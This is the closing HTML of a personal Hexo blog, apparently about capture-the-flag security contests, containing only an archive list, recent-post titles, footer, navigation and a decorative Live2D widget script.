      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/06/30/tctf2020/">tctf2020</a>
          </li>
        
          <li>
            <a href="/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/">拟态防御记录</a>
          </li>
        
          <li>
            <a href="/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/">2020第三届BJDCTF</a>
          </li>
        
          <li>
            <a href="/2020/05/20/bypass_csp/">bypass_csp</a>
          </li>
        
          <li>
            <a href="/2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/">2020年网鼎杯青龙组</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>